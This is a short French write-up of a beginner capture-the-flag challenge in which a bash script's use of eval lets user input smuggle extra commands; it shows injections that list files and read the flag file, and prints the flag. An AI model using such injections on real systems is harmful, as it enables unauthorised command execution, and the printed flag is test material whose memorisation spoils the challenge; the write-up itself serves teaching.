# Write-Up 404-CTF : Je veux la lune !

__Catégorie :__ Exploitation de binaires - Introduction

**Enoncé :**

![Enoncé du challenge](images/enonce.png)

**Fichiers :** donne_moi_la_lune.sh

**Résolution :**

Dans ce challenge, nous devons exploiter un script bash afin de récupérer un flag sur un serveur distant.

On remarque très vite la fonction `eval`, qui va évaluer n'importe quelle chaîne de caractère (mais uniquement lors du premier `grep`).

Nous pouvons déjà faire un premier repérage en tentant la commande `bob informations.txt; ls #`

```
Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !

En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?
> bob informations.txt; ls #
donne_moi_la_lune.sh
informations.txt
lune.txt
```
La commande fonctionne. On peut voir plusieurs fichier sur le serveur comme le script, `informations.txt` mais aussi `lune.txt`.  
Nous n'avons qu'à injecter la commande `bob informations.txt; cat lune.txt #` pour avoir le flag.

**Flag :** `404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}`